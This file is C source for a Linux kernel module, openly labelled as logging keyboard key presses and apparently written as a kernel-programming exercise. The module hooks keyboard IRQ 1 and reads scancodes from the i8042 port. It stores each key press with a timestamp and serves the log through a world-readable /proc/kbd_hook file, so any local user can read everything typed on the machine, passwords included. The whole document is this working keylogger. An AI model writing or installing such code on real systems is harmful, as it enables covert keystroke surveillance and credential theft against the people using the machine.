#include <asm/io.h>
#include <linux/interrupt.h>
#include <linux/ktime.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/rtc.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Shanygin");
MODULE_DESCRIPTION("Module logging keys pressed on keyboard");
MODULE_VERSION("0.1");

#define IRQ_KBD 1
#define KEYBUF_SIZE 8
#define LOG_ENTRY_SIZE 64
#define I8042_DATA_REG 0x60
#define SCANCODE_RELEASED_MASK 0x80
#define PROCFS_FILE "kbd_hook"
#define MODULE_NAME "kbd_hook"

static unsigned int buffer_size = 256;
module_param(buffer_size, uint, 0644);

struct keylog {
  u8 scancode;
  u64 ts;  // timestamp in nanoseconds
};

static struct keylog *keylogs;
static int keylog_count;

static DEFINE_SPINLOCK(spinlock);
static struct proc_dir_entry *proc_entry;

static int is_key_press(unsigned int scancode) {
  return !(scancode & SCANCODE_RELEASED_MASK);
}

static void get_key_name(unsigned int scancode, char *buf) {
  static const char *row1 = "1234567890";
  static const char *row2 = "qwertyuiop";
  static const char *row3 = "asdfghjkl";
  static const char *row4 = "zxcvbnm";

  if (scancode >= 0x02 && scancode <= 0x0b) {
    *buf = *(row1 + scancode - 0x02);
  } else if (scancode >= 0x10 && scancode <= 0x19) {
    *buf = *(row2 + scancode - 0x10);
  } else if (scancode >= 0x1e && scancode <= 0x26) {
    *buf = *(row3 + scancode - 0x1e);
  } else if (scancode >= 0x2c && scancode <= 0x32) {
    *buf = *(row4 + scancode - 0x2c);
  } else {
    switch (scancode) {
      case 0x39:
        snprintf(buf, KEYBUF_SIZE, "SPACE");
        return;
      case 0x1C:
        snprintf(buf, KEYBUF_SIZE, "ENTER");
        return;
      case 0x0F:
        snprintf(buf, KEYBUF_SIZE, "TAB");
        return;
      case 0x53:
        snprintf(buf, KEYBUF_SIZE, "DELETE");
        return;
      case 0x47:
        snprintf(buf, KEYBUF_SIZE, "HOME");
        return;
      case 0x4F:
        snprintf(buf, KEYBUF_SIZE, "END");
        return;
      case 0x4B:
        snprintf(buf, KEYBUF_SIZE, "LEFT");
        return;
      case 0x48:
        snprintf(buf, KEYBUF_SIZE, "UP");
        return;
      case 0x50:
        snprintf(buf, KEYBUF_SIZE, "DOWN");
        return;
      case 0x4D:
        snprintf(buf, KEYBUF_SIZE, "RIGHT");
        return;
    }
    snprintf(buf, KEYBUF_SIZE, "0x%02x", scancode);
    return;
  }
  *(buf + 1) = 0;
}

static ssize_t kbd_hook_read(struct file *f, char __user *ubuf, size_t len,
                             loff_t *off) {
  if (*off) {
    return 0;
  }
  unsigned long flags;
  spin_lock_irqsave(&spinlock, flags);

  if (!keylog_count) {
    spin_unlock_irqrestore(&spinlock, flags);
    return 0;
  }

  char *kbuf = kmalloc(keylog_count * LOG_ENTRY_SIZE, GFP_ATOMIC);
  if (!kbuf) {
    spin_unlock_irqrestore(&spinlock, flags);
    return -ENOMEM;
  }

  char keybuf[KEYBUF_SIZE];
  size_t formatted_len = 0;

  for (int i = 0; i < keylog_count; i++) {
    struct keylog *log = &keylogs[i];

    get_key_name(log->scancode, keybuf);

    struct timespec64 ts = ktime_to_timespec64(log->ts);
    struct tm tm;
    time64_to_tm(ts.tv_sec, 0, &tm);

    formatted_len +=
        snprintf(kbuf + formatted_len, LOG_ENTRY_SIZE,
                 "%04ld-%02d-%02d %02d:%02d:%02d.%09ld %s\n", tm.tm_year + 1900,
                 tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec,
                 ts.tv_nsec, keybuf);
  }

  keylog_count = 0;

  spin_unlock_irqrestore(&spinlock, flags);

  if (formatted_len > len) {
    formatted_len = len;
  }

  if (copy_to_user(ubuf, kbuf, formatted_len)) {
    kfree(kbuf);
    return -EFAULT;
  }

  kfree(kbuf);
  *off = formatted_len;

  return formatted_len;
}

static const struct proc_ops kbd_hook_fops = {
    .proc_read = kbd_hook_read,
};

static inline u8 i8042_read_data(void) {
  u8 val;
  val = inb(I8042_DATA_REG);
  return val;
}

static irqreturn_t kbd_hook_interrupt_handle(int irq_no, void *dev_id) {
  u8 scancode = i8042_read_data();
  unsigned long interrupt_flags;

  if (is_key_press(scancode)) {
    spin_lock_irqsave(&spinlock, interrupt_flags);

    if (keylog_count < buffer_size) {
      keylogs[keylog_count].scancode = scancode;
      keylogs[keylog_count].ts = ktime_get_real_ns();
      keylog_count += 1;
    }

    spin_unlock_irqrestore(&spinlock, interrupt_flags);
  }

  return IRQ_HANDLED;
}

static int __init kbd_hook_init(void) {
  if (buffer_size == 0) {
    printk(KERN_ERR "kbd_hook: zero buffer is not allowed\n");
    return -EINVAL;
  }

  keylogs = kmalloc_array(buffer_size, sizeof(struct keylog), GFP_KERNEL);
  if (!keylogs) {
    printk(KERN_ERR "kbd_hook: failed to allocate array for keylogs\n");
    return -ENOMEM;
  }

  keylog_count = 0;

  int ret = request_irq(IRQ_KBD, kbd_hook_interrupt_handle, IRQF_SHARED,
                        MODULE_NAME, keylogs);

  if (ret) {
    printk(KERN_ERR "kbd_hook: failed to request irq. Error: %d\n", ret);
    kfree(keylogs);
    return ret;
  }

  proc_entry = proc_create(PROCFS_FILE, 0444, NULL, &kbd_hook_fops);

  if (!proc_entry) {
    free_irq(IRQ_KBD, keylogs);
    kfree(keylogs);
    return -ENOMEM;
  }

  return 0;
}

static void __exit kbd_hook_exit(void) {
  if (proc_entry) proc_remove(proc_entry);

  free_irq(IRQ_KBD, keylogs);
  kfree(keylogs);
}

module_init(kbd_hook_init);
module_exit(kbd_hook_exit);
